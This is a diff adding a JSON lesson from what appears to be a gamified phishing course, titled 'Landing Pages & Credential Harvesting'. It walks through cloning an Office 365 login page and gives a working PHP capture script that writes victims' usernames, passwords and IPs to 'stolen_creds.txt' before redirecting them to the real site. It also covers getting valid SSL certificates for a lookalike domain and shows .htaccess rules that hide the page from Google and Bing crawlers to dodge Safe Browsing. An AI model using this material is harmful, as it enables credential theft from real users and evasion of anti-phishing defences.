@@ -1,0 +1,102 @@
+{
+    "id": "l4",
+    "chapterId": "ch_4",
+    "title": "Landing Pages & Credential Harvesting",
+    "description": "Clone login pages, evade browser warnings, and capture credentials in real-time.",
+    "xpReward": 30,
+    "estimatedMinutes": 8,
+    "section": "Technical Tactics",
+    "slides": [
+        {
+            "id": "s_l4_1",
+            "type": "text",
+            "title": "The Other Side of the Click 🖱️",
+            "content": "# What Happens After They Click?\n\nYou've crafted the perfect email. The user clicks the link. Now what?\n\n**Scenario A (Amateur):** They see a weird, broken website. They close the tab. **FAIL.**\n\n**Scenario B (Pro):** They see the **exact** login page they expected (Office 365, Google, Salesforce). They type their password. The page says *\"Incorrect Password\"* and redirects them to the **real** site. They think they mistyped. They log in successfully.\n\n**You now have their credentials.**\n\nThis is a **Credential Harvesting Landing Page**. It's the core of modern phishing."
+        },
+        {
+            "id": "s_l4_2",
+            "type": "text",
+            "title": "Cloning a Login Page 🧬",
+            "content": "# Save the Website\n\nYou don't need to be a web designer. You just need to be a good **thief**.\n\n**Method 1: Manual Clone (Browser)**\n1.  Navigate to the real login page (e.g., `login.microsoftonline.com`).\n2.  Right-click -> **Save Page As...** -> **Webpage, Complete**.\n3.  This saves the HTML file AND a folder of images/CSS/JS.\n4.  Edit the HTML file. Find the `<form action=\"...\">` tag.\n5.  Change the `action` to point to **your phishing server's capture script** (`capture.php`).\n\n**Method 2: Automated Tools**\n- **Social-Engineer Toolkit (SET):** `setoolkit` -> `Website Attack Vectors` -> `Credential Harvester`.\n- **Evilginx2/3:** Advanced framework that proxies the **real** site in real-time (covered in Lesson 5).\n- **GoPhish:** Includes a simple landing page editor and import feature."
+        },
+        {
+            "id": "s_l4_3",
+            "type": "quiz",
+            "title": "Landing Page Basics 🧠",
+            "content": "",
+            "quizData": {
+                "id": "q_l4_1",
+                "type": "multiple_choice",
+                "question": "What is the critical HTML element that must be modified in a cloned login page to steal credentials?",
+                "options": [
+                    {
+                        "id": "opt1",
+                        "text": "The <title> tag",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt2",
+                        "text": "The <form> action attribute",
+                        "isCorrect": true
+                    },
+                    {
+                        "id": "opt3",
+                        "text": "The <img> src attribute",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt4",
+                        "text": "The <body> background color",
+                        "isCorrect": false
+                    }
+                ],
+                "explanation": "Correct. The 'action' attribute tells the browser where to send the username and password. Change it to your server's script.",
+                "xpReward": 10
+            }
+        },
+        {
+            "id": "s_l4_4",
+            "type": "code",
+            "title": "The Capture Script (PHP Example) 💾",
+            "content": "A simple PHP script to log credentials and redirect the user:",
+            "codeSnippet": "<?php\n// capture.php\n$username = $_POST['username'] ?? $_POST['email'] ?? $_POST['loginfmt'] ?? 'N/A';\n$password = $_POST['password'] ?? $_POST['passwd'] ?? 'N/A';\n$ip = $_SERVER['REMOTE_ADDR'];\n$user_agent = $_SERVER['HTTP_USER_AGENT'];\n\n$log = \"[+] IP: $ip | User: $username | Pass: $password | UA: $user_agent\\n\";\nfile_put_contents('stolen_creds.txt', $log, FILE_APPEND);\n\n// Redirect to the real login page so the user thinks they mistyped\nheader('Location: https://login.microsoftonline.com/');\nexit;\n?>",
+            "codeLanguage": "php",
+            "canRunCode": false
+        },
+        {
+            "id": "s_l4_5",
+            "type": "tip",
+            "title": "Bypassing Browser Warnings 🛡️",
+            "content": "# SSL Certificates Matter\n\n**Scenario:** User clicks `https://your-evil-site.com`. Chrome shows a **giant red warning: 'Your connection is not private'** .\n\n**Result:** **99% of users click 'Back to Safety'.** **FAIL.**\n\n**The Fix: Let's Encrypt SSL**\nUse **Certbot** (Let's Encrypt) to get a **free, valid SSL certificate** for your phishing domain.\n\n**Steps:**\n1.  Point your domain (e.g., `vpn-acmecorp.com`) to your phishing server IP.\n2.  Run `certbot --nginx -d vpn-acmecorp.com` (or Apache).\n3.  **Result:** Your phishing site shows the **Lock Icon** 🔒. The user feels **safe**."
+        },
+        {
+            "id": "s_l4_6",
+            "type": "quiz",
+            "title": "SSL & Warnings 🧠",
+            "content": "",
+            "quizData": {
+                "id": "q_l4_2",
+                "type": "true_false",
+                "question": "True or False: Using a valid SSL certificate from Let's Encrypt on a phishing domain will bypass all browser security warnings.",
+                "options": [],
+                "explanation": "False. It bypasses the **'Not Secure' connection warning**. However, if the domain is reported and added to **Google Safe Browsing**, the user will still see a **Red Deceptive Site Warning**. SSL is necessary but not sufficient.",
+                "xpReward": 10
+            }
+        },
+        {
+            "id": "s_l4_7",
+            "type": "text",
+            "title": "Evading Safe Browsing & Proxies 🕵️",
+            "content": "# Staying Under the Radar\n\n**Problem:** Google Safe Browsing crawls the web looking for phishing pages. If they find yours, your domain is **burned** and Chrome blocks it.\n\n**Defense Techniques:**\n1.  **IP/Crawler Blocking:** Use `.htaccess` or server config to block known scanner IP ranges (Googlebot, Bingbot, etc.) from seeing the phishing content. Show them a **404 Error** or a **benign blog page**.\n2.  **Redirect Chain:** Don't put the phishing page at the **root** of the domain (`/`). Put it at a long, random path: `vpn-acmecorp.com/a7f3k9m2/login`. Only users who click the email link see it. Bots scanning the root get a blank page.\n3.  **Geofencing:** Only serve the phishing page to IP addresses in the **target country** (e.g., USA). Serve a 404 to everyone else."
+        },
+        {
+            "id": "s_l4_8",
+            "type": "code",
+            "title": ".htaccess Bot Blocking Example 🚫",
+            "content": "Block known security scanners from seeing your phishing page.",
+            "codeSnippet": "# .htaccess\nRewriteEngine On\nRewriteCond %{HTTP_USER_AGENT} (googlebot|bingbot|slurp|duckduckbot|facebookexternalhit) [NC,OR]\nRewriteCond %{REMOTE_ADDR} ^66\\.249\\. [OR]\nRewriteCond %{REMOTE_ADDR} ^66\\.102\\.\nRewriteRule ^phish/ - [R=404,L]",
+            "codeLanguage": "apache",
+            "canRunCode": false
+        }
+    ]
+}
